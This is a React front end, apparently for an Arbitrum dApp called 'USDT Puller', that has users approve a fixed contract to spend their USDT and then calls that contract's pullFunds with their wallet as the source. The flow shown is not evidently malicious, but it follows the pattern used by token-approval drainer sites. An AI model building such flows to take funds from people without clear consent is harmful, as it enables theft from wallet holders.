import { useState } from 'react';
import { ethers } from 'ethers';

const usdtAddress = '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9'; // USDT (Arbitrum)
const contractAddress = '0x9f56Ef3326d58D7f2aEcfD4F72FD0FBB7677a411'; // Your contract

const usdtAbi = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function decimals() view returns (uint8)'
];

const contractAbi = [
  'function pullFunds(address from, uint256 amount) external'
];

export default function USDTDapp() {
  const [wallet, setWallet] = useState('');
  const [amount, setAmount] = useState('');
  const [status, setStatus] = useState('');

  const connectWallet = async () => {
    if (window.ethereum) {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      setWallet(accounts[0]);
    }
  };

const approveUSDT = async () => {
  if (!wallet || !amount) return;
  try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
    const decimals = await usdt.decimals();
    const amt = ethers.parseUnits(amount, decimals);
    const tx = await usdt.approve(contractAddress, amt);
    setStatus('Approving...');
    await tx.wait();
    setStatus('Approved!');
  } catch (err) {
    setStatus('Approve failed');
    console.error(err);
  }
};


  const pullFunds = async () => {
    if (!wallet || !amount) return;
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(contractAddress, contractAbi, signer);
      const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
      const decimals = await usdt.decimals();
      const amt = ethers.parseUnits(amount, decimals);
      const tx = await contract.pullFunds(wallet, amt);
      setStatus('Pulling funds...');
      await tx.wait();
      setStatus('Funds pulled!');
    } catch (err) {
      setStatus('Pull failed');
      console.error(err);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-6 bg-gray-100">
      <h1 className="text-2xl font-bold mb-4">USDT Puller DApp (Arbitrum)</h1>

      {wallet ? (
        <div className="mb-4 text-green-700">Connected: {wallet}</div>
      ) : (
        <button onClick={connectWallet} className="p-2 bg-blue-600 text-white rounded">Connect Wallet</button>
      )}

      <input
        className="p-2 border rounded mb-4 w-64"
        placeholder="Enter amount (e.g., 100)"
        value={amount}
        onChange={(e) => setAmount(e.target.value)}
      />

      <div className="flex gap-4">
        <button onClick={approveUSDT} className="p-2 bg-yellow-500 text-white rounded">Approve USDT</button>
        <button onClick={pullFunds} className="p-2 bg-green-600 text-white rounded">Pull Funds</button>
      </div>

      {status && <p className="mt-4 text-blue-700">{status}</p>}
    </div>
  );
}
